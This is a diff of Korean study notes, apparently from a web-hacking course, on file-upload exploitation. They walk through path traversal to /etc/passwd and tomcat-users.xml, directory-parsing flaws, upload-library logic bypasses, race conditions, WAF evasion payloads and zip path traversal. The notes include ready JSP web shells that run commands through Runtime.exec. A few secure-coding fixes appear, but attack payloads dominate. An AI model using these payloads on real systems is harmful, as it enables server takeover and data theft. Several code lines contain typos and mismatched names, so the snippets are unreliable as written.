+			파일 접근시 실행 test.php?cmd=ipconfig
+		
+		16. ../ 제거 -> te../st.png 테스트
+			..././..././..././upload.jsp 파일 분석 -> gubun 에 따라 업로드폴더 별도
+			..././..././..././WEB-INF/web.xml 확인 -> 각각 gubun 에따른 폴더 확인
+			gubun=xml 로 변경해서 실행권한이 있는 폴더로 설정
+		
+		17. iis asp 취약점
+			
+			name="UserID"
+			TEST.asp -> 디렉터리 파싱 테스트 -> 차단됨
+			test.asp. 우회됨, 디렉터리는 뒤에 . 이사라짐 (윈도우 폴더로 테스트가능)
+			
+			filename=logo.png" -> png 쉘코드 파일
+			<% Response.Write("test")%>
+			
+			upload/test.asp/logo.png -> 접근할떄는 . 지우고(제거)
+			
+			test.asp; 으로 폴더명으로 해도 iis 취약점으로 공격가능
+		
+		18. 톰캣 매니저 획득
+			../a.png -> 파일이 존재하지않습니다. -> 경로 변경 정상
+			real_filename=../../../../etc/passwd 
+			url/manager 로 접근 -> 패스워드 확인필요
+			../../../../proc/self/environ -> pwd 웹디 획득, home= root 학인
+			../../../../root/.bahs_history -> tomcat 경로 확인
+			../../../../usr/local/tomcat/conf/tomcat-users.xml ->아이디 비번 확인가능
+			war파일 업로드
+		
+		* 시나리오 - 리버스 커넥션을 통한 원격 터미널연결(아웃바운드정책확인), 시스템 명령어를 통한 정보수집, 서버내 정보수집, db침투, 내부 네트워크 취약한 서비스 탐색 및 공격
+			취약한 공유 폴더 통한 중요정보 탈취, 내부 침투 후 악의적 행위(인사시스템 , 메일 등), 망연계 시스템 서버 침투 후 내부망 침투
+	
+	
+		
+	
+				
+	대응방안
+		
+	
+		시큐어코딩
+			php ex
+				if(!preg_match("/^[a-zA-Z0-9]*$/", $gubun)){
+				exit();}
+					특수문자 다 안됨
+				$filename=$_FILES["userfile"]["name"];
+				$file_info=pathinfo($path.$filename)
+				$ext= strtolower($file_info["extension"]);
+				$ext_err=array("gif"~)
+				if(!in_array($ext,$ext_arr)){ exit();}
+				
+				$uploadFileNm=rand(00000,99999)+rand(0000,99999).$ext;
+			
+			jsp ex
+				<%@ page Language="java" contentType="text/html"; charset=UTF-8" %>
+				<%@ page import="com.oreilly.servlet.MultipartRequest, java.io.*"%>
+				<% 
+					String path = request.getRealPath("WEB-IINF/upload"); // WEB-IINF/upload까지의 절대경로 획득
+					MultipartRequest multi = new MultipartRequest(request, path, 1024*10, "UTF-8"); 
+					//웹 페이지에서 서버로 업로드되는 파일 자체만 다루는 클래스 
+					// 웹 브라우저가 전송한 multipart/form-data 유형과 POST 방식의 요청 파라미터 등을 분석한 후 일반 데이터와 파일 데이터를 구분하여 파일 데이터에 접근
+					String fileName=multi.getFilesystemName("userfile");
+					String fileExt=fileName.substring(fileName.lastIndexOf(".")+1).toLowerCase(); // lastIndexOf <- 뒤에서 부터 . 찾기
+					
+					String fullpath = path+"\\"+fileName;
+					File fd = new File(fullpath);
+					
+					if(!(fileExt.equals("png")||~~){
+						fd..delete();
+						out.println(~)
+						return;
+					}
+					String gubun = multi.getParameter("gubun");
+					gubun=gubun.replace("\\", "/");
+					if(gubun.indexOf("/") !=-1 || gubun.indexOf("..") != -1){
+						fd..delete();
+						out.println(~)
+						return;
+					}
+					String movePath = path + "\\" + gubun;
+					File fdDir = new File(movePath);
+					if(!fdDir.exists()){
+					fdDir.mkdirs() }//디렉 생성
+					fd.renameTo(new File(fdDir+"\\"+filename));
+					String savepath =movePath +"\\"+fileName;
+
+		
+고급 기법
+	WAS, WAS설정, 업로드 폴더,프레임워크, 라이브러리, 네트워크, 웹방화벽 등등 환경에따라 다름
+	
+	파일 업로드 라이브러리1 (COS)
+		JAVA 웹환경에서는 파일 업로드 (외부)라이브러리가 필요
+		-> 기본 라이브러리에 없어서, 요청값 편의(핸들링) 등등
+		
+		O'Reilly- COS 라이브러리, Apache- Commons 라이브러리
+		스프링 2.0까지는 cos, 2.5 이후는 commons (그냥 2.5이상도 cos 사용하는경우도 존재)
+		
+		
+		cos 소스코드
+			String path = request.getRealPath("/cos/upload")
+			MultipartRequest multi= new MultipartRequest(request,path,1024*10*10,"UTF-8"); -> 이 한라인으로 업로드가 다 된다.
+			String filename = multi.getFilesystemName("file");
+			
+			대응(불완전)
+			String path = request.getRealPath("/cos/upload")
+			MultipartRequest multi= new MultipartRequest(request,path,1024*10*10,"UTF-8")
+			Enumeration formNames= multi.getFileNames();
+			while(formNames.hasMoreElements())
+			{
+				String param=(String)formNames.nextElement();
+				String uploadFile=multi.gerFilesystemName(param);
+				int extOffset=uploadFile.lastIndexOf('.');
+				String fileExt= uploadFile.substring(extOffset+1).toLowerCase();
+				File fp=new File(path,uploadFile);
+				if(!fileExt.equals("jpg")&&!fileExt.equals("png")...){
+				fp.delete();
+				return;}
+			}
+			
+		cos 라이브러리 분석
+			MultipartRequest.class
+				요청값 바디 content-disposition, name,filename 파싱하여 저장
+				filePart.writeTo(dir) // 파일 작성
+				this.files.put(name,new UploadedFile(dir.toString(),filepart.getFileName(), fileName,filePart.getContentType());
+					// files 는 해쉬 테이블, 해당 파일을 쉽게 찾을수 있개 해쉬테이블에 객체정보 저장 , key값은 name
+				
+				getFileNames -> return this.files.keys();
+				-> String param 에 키 값 저장됨 (name=file 의 "file")
+				multi.gerFilesystemName(param); -> 해당 키(file)의 대한 객체를 가져와 객체내 filename 값을 가져옴(파일명)
+		
+		라이브러리 동작원리
+			upload.jsp 에서 업로드 파일 받기 -> cos.jar 라이브러리 호출 -> writeto 해서 업로드 후 파일 객체를 반환 -> upload.jsp에서 핸들링 가능(제어(파일수정,삭제등))
+			업로드 후 처리되는 점에서 발생되는 잠재적 보안위협 존재
+		
+		잠재적 위협1 - 모든 파리미터에 대한 검증 미흡
+			String path = request.getRealPath("/cos/upload")
+			MultipartRequest multi= new MultipartRequest(request,path,1024*10*10,"UTF-8")
+			String filename=multi.gerFilesystemName("file"); //;name="file" -> 키 값 ,filename="a.txt"
+			int extOffset=filename.lastIndexOf('.');
+			String fileExt= filename.substring(extOffset+1).toLowerCase();
+			File fp=new File(path,filename);
+			if(!fileExt.equals("jpg")&&!fileExt.equals("png")...){
+				-> "file" key 값을 직접 지정하였기에 name="file1" 로 변경시 filename에 null이 반환되고 
+				아래의 확장자 검증은 건너뛰게됨 하지만 업로드는 이미 전에 하기때문에 업로드가됨
+			
+			Enumeration formNames= multi.getFileNames();
+			while(formNames.hasMoreElements())
+			{
+				String param=(String)formNames.nextElement();
+				String uploadFile=multi.gerFilesystemName(param);
+			...
+				-> 해당 formNames은 모든 키값을 받아와서 while로 하나씩 확인함 key가 file1인 부분이 이미 multipartRequest에서 저장됬으므로
+				file1인 키 filename을 받아와 확장자 검증을 진행
+			
+			실습
+				Content-Disposition:form-data; name="file"; filename="test.jsp" -> 차단됨
+				Content-Disposition:form-data; name="test2"; filename="test.jsp" -> 응답 200 빈페이지 출력 -> 내부에서 업로드가 된 상태
+		
+		잠재적 위협2 - 확장자 검증 후 파일 미 삭제 처리
+			String path = request.getRealPath("/cos/upload")
+			MultipartRequest multi= new MultipartRequest(request,path,1024*10*10,"UTF-8")
+			Enumeration formNames= multi.getFileNames();
+			while(formNames.hasMoreElements())
+			{
+				String param=(String)formNames.nextElement();
+				String uploadFile=multi.gerFilesystemName(param);
+				int extOffset=uploadFile.lastIndexOf('.');
+				String fileExt= uploadFile.substring(extOffset+1).toLowerCase();
+				File fp=new File(path,uploadFile);
+				if(!fileExt.equals("jpg")&&!fileExt.equals("png")...){
+				return;}
+			}
+			-> 확장자 검증 후 fp.delete()가 없는 상태 
+		
+		잠재적 위협3 - 중복 키 값에 대한 처리 오류
+			String path = request.getRealPath("/cos/upload")
+			MultipartRequest multi= new MultipartRequest(request,path,1024*10*10,"UTF-8")
+			Enumeration formNames= multi.getFileNames();
+			while(formNames.hasMoreElements())
+			{
+				String param=(String)formNames.nextElement();
+				String uploadFile=multi.gerFilesystemName(param);
+				int extOffset=uploadFile.lastIndexOf('.');
+				String fileExt= uploadFile.substring(extOffset+1).toLowerCase();
+				File fp=new File(path,uploadFile);
+				if(!fileExt.equals("jpg")&&!fileExt.equals("png")...){
+				fp.delete();
+				return;}
+			}
+			-> 전제조건 : 업로드되는 디렉터리가 웹 디렉터리다.
+			
+			MultipartRequest.class
+				filePart.writeTo(dir) // 파일 작성
+				this.files.put(name,new UploadedFile(dir.toString(),filepart.getFileName(), fileName,filePart.getContentType());
+				files(해쉬테이블), name- 키값, uploadedfile - value 
+				
+				키값이 중복 발생 
+					'file' - 'test.png'
+					'file' - 'test.jpg'
+						->해쉬테이블 k:file , test.jpg 로 변경됨
+						-> test.png가 핸들링 될수 가 없음
+						-> test.png는 확장자 검증로직이 거치지 않음
+					'test.jsp' 업로드후 'test.jpg' 업로드 수행하여 jsp파일 로직 우회
+				
+				실습 
+					업로드 파일을 하나더 추가하여 진행 (jsp 먼저)
+					--------------------
+					Content-Disposition:form-data; name="file"; filename="test.jsp"
+					
+					<% out.println("test"); %>
+					--------------------
+					Content-Disposition:form-data; name="file"; filename="test.png"
+					Content-type: text/plain
+					
+					--------------------
+					-> test.jsp 업로드 성공
+				
+		잠재적 위협4 - 레이스 컨디션 공격(DOS)
+			업로드(MultipartRequest) -> 삭제(fp.delete()) 까지 시간차 발생
+			업로드 웹쉘 -> 요청 웹쉘 진행
+			
+			업로드 시도하는 공격과 업로드되는 웹쉘에 접근하여 명령어 실행하는 공격 동시에 실행 - 둘다 매우많이 지속적으로 동작하게
+			faile - 명령어 실행 -faild 실패 중간중간 명령어 실행됨
+		
+		대응 - 모든 파일 파리미터 검증, 확장자 검증후 파일삭제, 파일 업로드시 웹디렉터리가 아닌 경로 설정(임시 디렉터리에서 확장자 검증후 웹디렉터리에 저장)
+		
+	
+	파일 업로드 라이브러리2 (Apache- Commons 라이브러리 , spring)
+		경로 조작 잠재적 위협 존재
+		
+		소스코드
+			item.write(new File(saveFilePath, userFileName)); -> 경로(userFileName) 가 그대로 저장
+			filename="../a.jsp"
+			filename="..\a.jsp" 업로드 가능
+		
+		스프링 프레임 워크(2.5이상 사용)
+			취약버전 : spring-web-3.2.15.Release 이하
+				-> 
+				pos=filename.lastIndexOf("/"); 
+				if(pos == -1) pos=filename.lastIndexOf("\\"); 
+				filename.substring(pos+1); 
+					-> 처음 "/" 체크 후 그 뒤에있는 "\"는 체크를 하지 않음, 둘중 하나만 체크함
+					test/..\..\..\..\test.jsp -> "/" 의 위치가 pos 가 되어 ..\~ 가 파일명이 된다.
+			
+			양호 버전
+				int unixsep=filename.lastIndexOf("/"); 
+				int winsep=filename.lastIndexOf("\\"); 
+				int pos = (winsep > unixsep ? winsep : unixsep) -> 둘중 뒤에 있는걸 무조건 위치로 한다.
+			
+			
+				
+	웹 방화벽 우회(WAF)
+		화이트 리스트 방식 많이 사용
+		
+		제로데이(was, 프레임워크,라이브러리 결함)
+		널바이트 문자 - filename="a.jsp%00.png"
+		윈도우 . 사용 - finlename="a.jsp." (의미없는 문자 사용)
+		-> 해석의 차이를 이용 (ex_서버에서는 %00 널을 지우니깐 a.jsp 로 인식되나 waf는 지우지 않으니 .png로 인식되는 )
+		
+		1. filenmae 중복 사용
+			cos - 가능, commons - 추가우회(널바이트)
+			~filename="a.txt"; filename="b.txt"
+				웹방화벽 : b.txt 탐지
+				웹서버 (cos, iis(버전에따라) : a.txt 인식
+				웹서버 (apache commons) : b.txt 인식
+					널바이트 사용 하여 뒤에 인식막기 ->  filename="a.jsp";%00[이거 디코딩(multipart)] filename="b.txt"  : a.jsp 인식됨
+				
+		2. 대문자사용
+			cos - 가능 , commons- x
+			filename="aj.jsp" -> FileNAme='a.jsp'
+			헤더 : Conten-Type: multipart/form-data -> MulTipart/form-data;
+		
+		3. 더블 쿼터 문자 삽입
+			cos - 가능 , commons- x
+			filename="a.jsp"b.txt" -> a.jsp 업로드
+			웹방화벽 - b.txt 인식
+			웹서버 - a.jsp 인식
+			
+		4. 더블 쿼터 문자 제거, 세미콜론
+			cos - x , commons- 가능
+			filename="a.jsp" -> filename=a.jsp 
+			또다른
+			filename=a.jsp;b.txt
+		
+		5. mime의 encoded-word 문법 사용
+			cos - x , commons- 가능
+			Conten-Type: multipart/form-data  - MIME(전자표준)의 한 형태
+			encoded-word 문법 : =?charset?encoding?encoded-text?=
+				charset : utf-8, euc-kr ...
+				encoding : Q(Quoted-printable), B(Base64)
+				encoded-text : encodig 에 해당하는 인코딩된 문자열
+				
+				Q(Quoted-printable) - crehactive ->url_incoding %63%72%65...%65 -> Q =63=72=65=68...=65  
+					-> URL 인코딩하고 '=' 으로 바꾸고 charset, encoding, =? ?= 붙이면된다.
+				B - crehactive -> Y3Jla...u=
+				
+				예시 =?utf-8?B?YWJj?=
+					=?utf-8?Q?=61=62=63?=   
+					-> 'abc'
+			
+			소스코드 - "=?" 존재 시 decode 실시(=? ~? 사이 값 추출 - word.indexof("?",2) , word.substring(2,charsetPos)->6 )
+				charset = "utf-8" 
+				encoding ="B"
+				encoded-test="YWJj"
+				각각 디코딩 하여 저장
+			
+			a.jsp -> filename="=?utf-8?Q?=61=2e=6a=73=70?="
+			a.jsp -> filename="=?utf-8?B?YS5qc3A=?=" 
+		
+		6. filename에 집중하지 않고 다양한 부분에 시도(cookie, name 등), form-data , type 등 
+			
+			
+		
+	JEUS, WEBSPHERE 디렉터리 파싱 취약점
+		기존 파싱 취약점 - /upload/cmd.asp/ha.txt 디렉터리명이 asp 되어있으면 실제 파일은 상관없이 동적자원으로 인식되어 실행
+		
+		JEUS, WEBSPHERE -> WAS- >JAVA - TOMCAT과 비슷한
+			- JEUS webToB(웹서버) 같이 사용 많이
+		
+		IMB WebSpehre(CVE-2020-4163), JEUS(7.0(FIX#1)이하))
+		
+		디렉터리 파싱
+			디렉터리명이 서버사이트 확장자로 되어있을시 서버사이드 스크립트로 인식
+			1. 디렉토리 리스팅 취약점 (upload/ha.jsp -> 목록출력) 
+			2. 코드 실행 취약점 (ha.jsp?cmd=ifconfig) , (ha.jsp/<%out.println("");%>.png)
+			
+		프로세스 : 업로드 기능 찾기 -> 전제조건 성립 확인 -> 취약점 존재 확인 -> 공격
+			
+		전제조건 성립 확인
+			취약한 WAS와 버전사용(확인어려움) , 디렉터리 생성 로직 존재, 리눅스 유닉스 서버 사용, 원본 파일명 업로드
+			
+			디렉터리 생성 로직 존재
+				UPLOAD/board , upload/img_bolard ... 이렇게 업로드폴더가 나뉘는 환경이 생성로직이 일반적으로 존재
+				?gubun=notice -> gubun=aa -> url 접근시도
+			
+			리눅스 유닉스 서버 사용
+				윈도우는 파일명 네이밍 규칙이 존재하여 웹쉘 생성 불가
+				리스팅은 가능하지만- 내가 생성 폴더에 내가보니깐 의미x
+				리눅스 : a.jsp/<%out.println("");%>.png 이렇게 가능
+				리눅스 파악
+					js/commOn.js (대문자 사용, 윈도우여도 없다고 나올수 있음(JAVA))
+					dowlonad.jsp?filename=creHackTiVe.png  
+						-> 언어단(JAVA)에서 체크가 아니라 OS측에서 파일있는지 체크
+						물론 특수상황에서는 아님(별도 코드 등)
+			
+			원본 파일명 업로드	
+				입력한 파일명이 최소한 포함되어있어야 한다.
+				<%out.println("");%>_2021_02_02.PNG 이렇게도 공격가능
+		
+			대전제 : 업로드 경로가 웹 디렉터리로 설정 -> 경로 조작 가능성 파악하여 웹디로 업로드수행
+		
+		취약점 존재 확인
+			Content-Disposition: form-data; name="gubun"
+				creah.jsp
+			
+			--aBoundaryString
+			Content-Disposition: form-data; name="MYFILE"; filename="test.txt"
+			Conten-Type:application/octet-stream
+			
+			~/upload/creah.jsp -url 접근
+				test.txt -> 출력 , 디렉터리 리스팅
+			=> 취약 판단
+			
+			Content-Disposition: form-data; name="gubun"
+				creah.jsp
+			
+			--aBoundaryString
+			Content-Disposition: form-data; name="MYFILE"; filename="<% out.println('a');%>.txt"
+			Conten-Type:application/octet-stream
+			
+			~/upload/creah.jsp
+				a.txt 출력
+			=> 취약 판단
+			
+			취약 위치 : 
+				1) url?gubun=community ... filename="test.txt"
+				2) Cookie: ... gubun=community  ... filename="test.txt"
+				3) Content-Disposition: form-data; name="gubun"  comunity  ... filename="test.txt"
+				4) Content-Disposition: form-data; name="comunity"; filename="test.txt"
+			
+		공격
+			filename="<% Runtime.getRuntime().exec(request.getParameter("cmd"));%>.txt"
+				-> url~/a.jsp?cmd=ifconfig
+				-> 자바 특성상 출력이 안될수 있다  매우불편
+			
+			제약조건1 - 최대파일명 길이(255자)
+				<%page import="java.io.*"%><%Process p=Runtion.getRuntime().exec(request.getParameter("c"));BufferedReader i=new BufferedReader(new InputStreamReader(p.getInputStream()));while(i.readLine()!=null){out.println(i.readLine());}p.destroy();%>
+				-> 240자
+			
+			제약조건2 - 더블쿼터 문자
+				cos 라이브러리는 "a"a" 하면 가운데 " 가 문자로 인식x
+				<%page import='java.io.*'%><%Process p=Runtion.getRuntime().exec(request.getParameter(Integer.toString(1)));BufferedReader i=new BufferedReader(new InputStreamReader(p.getInputStream()));while(i.readLine()!=null){out.println(i.readLine());}p.destroy();%>
+				-> /uplad/a.jsp?1=ifconfig
+			
+			제약조건3 - 확장자 검증
+				결국 해당 문자열은 파일명 -> 확장자 검증
+				<%page import='java.io.*'%><%Process p=Runtion.getRuntime().exec(request.getParameter(Integer.toString(1)));BufferedReader i=new BufferedReader(new InputStreamReader(p.getInputStream()));while(i.readLine()!=null){out.println(i.readLine());}p.destroy();%>.png
+				-> 해당하느 확장자 붙이기 .png
+		
+		취약점 활용
+			1. 확장자 검증 로직 -> .jsp 파일 업로드 불가할 경우
+			2. 파일명 알수 없을때
+				-> 디렉터리명은 그대로이고, 변경된 파일은 해당 jsp 접근 시 ㄹ리스팅으로 확인가능(
+		
+		대응 방안
+			1. was 업데이트
+			2. 소스코드
+				string gubun = request.getParameter("gubun");
+				boolean flag= Pattern.matches("^[0-9a-zA-Z_]*$", gubun);
+				또는
+				gubun=gubun.replace(".","");
+			
+	
+	실무환경 공격 방법
+		
+		타 서버 업로드 추정되는 환경
+			www.crehacktive.co.kr/download.jsp?seq=100
+			-> http:///file.crehacktive.co.kr/upload/commnunity/test.jsp
+				물리적으로 다른경우 -> SFTP, 마운트 , HTTP 등등 이용하여 업로드
+				같은 서버일수도
+			WAS에서 업로드 기능 수행-> was 웹 디렉터리 -> file.crehacktive.co.kr -> 웹디렉터리
+			
+			클라우드, cdn
+			
+			마운트 - 저장장치에 접근할수 있는 경로를 디렉터리 구조에 편입시키는 작업
+				www.crehacktive.co.kr/upload/service1 과 file.crehacktive.co.kr/upload를 마운트
+				www.crehacktive.co.kr/upload/service1 에 업로드 시 file.crehacktive.co.kr/upload에도 파일이 업로드됨
+				
+				웹디렉터리일경우
+					 file.crehacktive.co.kr/upload 업로드 경로 파악
+					 ->www.crehacktive.co.kr/upload/webshell.jsp 로 접근
+				아닌경우
+					-> 웹디렉터리가 아니기에 url로 접근 불가
+					-> 경로조작 하여 웹디렉터리에 jsp 업로드 수행
+			
+			FTP
+				COS.jar 라이브러리 - 웹디렉터리
+					웹디렉업로드 -> ftp전송 -> 기존 파일 삭제(삭제 안넣을수도, 접근 체크)
+					cos는 중복 키 값에 대한 처리 오류 실행 시 png만 지워지고 jsp는 그대로 또는 레이스컨디션
+					-> cos.jar 사용시 그냥 업로드 경로만 파악되면 ftp상관없이 실행가능
+				COS.jar 라이브러리 - 웹디x
+					url 접근 불가
+					경로조작 -> 웹디로 조작
+				Apache-commons -일반
+					일반적으로 업로드기능(메모리)-> 바로 file.로 ftp 전송 -> 취약점 힘드나 다운로드 취약점을 통해 업로드 코드 파악
+				Apache-commons - 웹디에 업로드 후 전송
+					이런 경우도 존재
+					동일하게 업로드 폴더내 jsp파일 접근 또는 경로조작
+			
+			동일한 서버내 웝서버와 웹 어플리케이션 서버의 다른 웹 디렉터리(WAS/웹서버 디렉터리 분리)
+				같은 서버지만, 웹디가 다름
+				file.crehacktive.co.kr 에 접근해도 실행x
+				/a/b/c/d -> 웹디, /a/b -> was 이런경우도 존재 -> ../../ 접근
+				
+				1.was웹디의 a.jsp 를 웹서버 디렉터리로 경로조작
+				2. 파다 불가 -> 심볼릭 링크
+					web/upload/profile/webshell.jsp -> profile 이 심볼릭
+					was/upload/profile/webshell.jps 연결되서 구성
+					-> 결국 심볼릭은 profile 이후는 동일하니
+					file.crehacktive.co.kr/upload/profile/a.jsp 가 업로드및 다운로드되면
+					www.crehacktive.co.kr/upload/profile/a.jsp 접근해서 다운
+					
+					심볼릭 파악
+					-> file.crehacktive.co.kr/community/upload/.../a.png , file.crehacktive.co.kr/notice/upload/.../b.txt 등등 
+					각 경로의 파일 파악 후 www.crehacktive.co.kr/community/upload/.../a.png 이렇게 변조해서 되는지 파악
+						-> 정상 접근 되는경우 해당 경로를 타겟으로 공격
+						-> notice만 취약한데 업로드 못하면, 다른곳에서 경로조작하여 업로드 수행
+		
+		Weblogic 환경
+			oracle -java - web application server
+			community/upload/a.jsp -> 됐는데 없다나옴 -> 스테이지모드
+			
+			스테이지모드
+				- 웹 어플리케이션을 배포, 컴파일, 실행 시 사용되는 임시 디렉터리 공간
+				웹디의 자원을 스테이지영역에 배포 -> 컴파일 -> 실행  
+				스테이지 영역에 웹쉘을 업로드 애야함
+				
+				/[weblogic_domain_home]/config/config.xml 
+					->도메인(하나의 서비스) 마다 config 설정
+					-> <staging-mode>stage</staging-mode>
+						<staging-directory>/weblogic/domains/cre/stage</stageing-directory>
+						...
+						<source-path>//weblogic/domains/cre/</source-path>
+						source-path가 웹디 -> /stage로 배포
+				
+				weblogc 진단시 config.xml 찾기 관건, 도메인
+					ex was_webroot/weblogic/domains/crehack/stage/a.jsp
+				
+				
+			노스테이지(일반)
+				->웹디에 자원 , 자원 접근하여 실시간 컴파일 실행 
+		
+		압축 해제 환경
+			a.zip(1.jpg, 2.jpg)
+			a.zip 업로드 -> images/1.jpg, images/2.jpg 업로드
+			shell.zip(webshell.jsp) 업로드 수행
+			
+			PKyrey....압축데이터... img.pngPK51 -> img.png 업로드
+			PKyrey....압축데이터... imga.pngPK51 -> imga.pn 업로드 , 파일명 7byte가 그대로 인식됐다
+			
+			...img.jsp%00.png 이렇게 해도 지정된 7byte만 인식되니 우회가 안됨
+			-> zip 파일 구조 central directroy[File Name length <- 16byte -> File Name] -> length 기입된 만큼 file name이 인식됨
+			00 00 8d 01 00 00 07 00   00 00 00 00 00 00 00 00
+			20 00 00 00 00 00 00 00   69 64 67 2e 6a 73 70 00(img.jsp%00)
+			-> 파일명 시작 69에서 16바이트 떨어진 2바이트 07 00 -> 0007 byte가 length
+			
+			00 00 8d 01 00 00 31 00   00 00 00 00 00 00 00 00
+			20 00 00 00 00 00 00 00   2e 2e 2f 2e 2e 2f 2e 2e
+			2f 2e 2e 2f 6a 65 75 73   2f 68 64 6d 5f 73 65 72
+			76 69 63 65 2f 77 65 62   72 6f 6f 74 2f 63 6d 64
+			2e 6a 73 70 00 2e 70 6e   67 50 4b 05 06 00 00 00
+			-> 31 00 (49 byte)
+			-> 2e ~ 70 6e 67 (../../../../jeus/hdm_service/webroot/cmd.jsp%00.png) 널바이트는 인코딩된x 직접 널바이트
+		
+		WEB-INF 업로드 환경
+			java 웹 어프리케이션의 웹 디렉터리 하위의 디렉터리
+			lib, class , web.xml 등 존재
+			
+			웹디렉터리 - was_webroot, WEB-INF, upload ... 
+			WEB-INF/upload - WEB-INF 하위에 업로드 폴더 위치 -> 비교적 안전 -> WEB-INF의 접근은 기본적으로 제한
+			URL로 접근 불가
+			
+			1.경로조작하여 올라와서 WEB-INF 벗어나기
+			2. 포워드 기능 악용(클라이언트 요청을 다른 자원으로 전달) ,웹디렉터리 상위 이동x
+				ex_ index.jsp?page=main -> index.jsp?page=main.jsp 추측
+			
+				WEB-INF 하위에 위치한다 가정(EX_ /WEB-INF/jsp/main.jsp)
+					index.jsp?page=../web.xml%00
+					index.jsp?page=../../web.xml%00
+					index.jsp?page=../../../web.xml%00
+					index.jsp?page=../../../../web.xml%00
+				웹디렉터리 하위 에 위치한다
+					index.jsp?page=../WEB-INF/web.xml%00
+					index.jsp?page=../..//WEB-INF/web.xml%00
+					index.jsp?page=../../../WEB-INF/web.xml%00
+					index.jsp?page=../../../../WEB-INF/web.xml%00
+				
+				index.jsp?page=main -> index.jsp?page=error.jsp  에러 발생
+				
+				WEB-INF 하위에 위치한다 가정(EX_ /WEB-INF/jsp/error.jsp)
+					index.jsp?page=../web.xml -> 이미 .jsp 까지 입력받는경우 널제거가능
+					index.jsp?page=../../web.xml
+					index.jsp?page=../../../web.xml
+					index.jsp?page=../../../../web.xml
+				웹디렉터리 하위 에 위치한다
+					index.jsp?page=../WEB-INF/web.xml
+					index.jsp?page=../..//WEB-INF/web.xml
+					index.jsp?page=../../../WEB-INF/web.xml
+					index.jsp?page=../../../../WEB-INF/web.xml
+					
+			3. 웹쉘 업로드
+				WEB-INF 내 정상 경로에 그대로 저장
+				/WEB-INF/upload/profile/webshell.jsp 
+				index.jsp?page=../../upload/webshell.jsp%00
+			
+		FCKeditor 리네이밍 보안 이슈
+			-> ck editor 로 변경
+			FCKEDITOR CORE ASP 2.6.8 arbitrary file upload protection bypass 취약점
+			
+			널바이트 치환 -> "_"
+			; filename="shell.aspx[NULL]jpg" -> shell.aspx_jpg 
+			- 다시요청 filename="shell.aspx[NULL]jpg" -> shell(1).aspx
+			
+			넘버링 하는 부분에서 중복된 파일명 존재시 . 뒤로 날림 -> shell(1) + 확장자 변수
+			-> 확장자 변수는 위에서 검증을 제외하고 별도로 저장됨(널바이트처리되서 aspx만 저장)
+			뒤에 shell(1)과 .aspx를 합침
+			
+			fck 이외 소스코드 잘못짜면 발생가능
+		
+		asp 웹쉘 시스템 명령어 실행 방법
+			1. cmd 명령 맘대로 실행 막음
+			2. 최상위 c:\ 파일 생성 불가
+			-> 변경 필요
+			
+			웹쉘
+			cmd.exe를 올림, 경로를 os cmd가 아닌 업로드한 cmd.exe를 지정(server.mappath(".") + cmd.exe)
+			최상위가 아닌 현재 경로에 파일 생성(
+			
+		
